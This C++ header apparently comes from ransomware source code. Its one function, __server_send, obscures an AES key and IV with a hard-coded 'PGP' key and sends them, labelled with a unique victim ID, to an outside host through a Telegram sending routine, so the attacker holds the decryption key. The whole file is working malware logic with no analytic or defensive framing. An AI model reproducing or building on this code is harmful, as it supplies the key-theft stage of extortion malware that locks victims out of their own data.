#pragma once
#include <iostream>
#include <Windows.h>
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
#include <random>
#include "settings.h"
#include "server.h"
#include "custom_ID.h"

std::string sIvString = SecByteBlockToString(__iv); //making it a string
std::string sKeyString = SecByteBlockToString(key); //making it a string

std::string sPgpKey = "d41d8cd98f00b204e9800998ecf8427e";

auto __server_send() -> bool
{
	std::string sKeyPgp = __pgp(sPgpKey, sKeyString);
	std::string sIvPgp = __pgp(sPgpKey, sIvString);
	std::cout << "\n [ sKeyPgp ] -> " << sKeyPgp;
	std::cout << "\n [ sIvPgp ] -> " << sIvPgp;

	std::string sKeyPgpDecrpyted = __pgp_dec(sPgpKey, sKeyPgp);
	std::string sIvPgpDecrpyted = __pgp_dec(sPgpKey, sIvPgp);
	std::cout << "\n [ sKeyPgpDecrpyted ] -> " << sKeyPgpDecrpyted;
	std::cout << "\n [ sIvPgpDecrpyted ] -> " << sIvPgpDecrpyted;


	std::string sBounder = "[=====================================================]";
	std::string sMessageKey = "[key] -> " + sKeyPgp;
	std::string sId = "[ID] -> " + __unique_id;
	std::string sMessageIv = "[iv] -> " + sIvPgp;
	std::string sBounderDown = "[key] -> " + sKeyPgp;

	__telegram_send(sBounder);
	__telegram_send(sId);
	__telegram_send(sMessageKey);
	__telegram_send(sMessageIv);
	__telegram_send(sBounder);
	return true;
}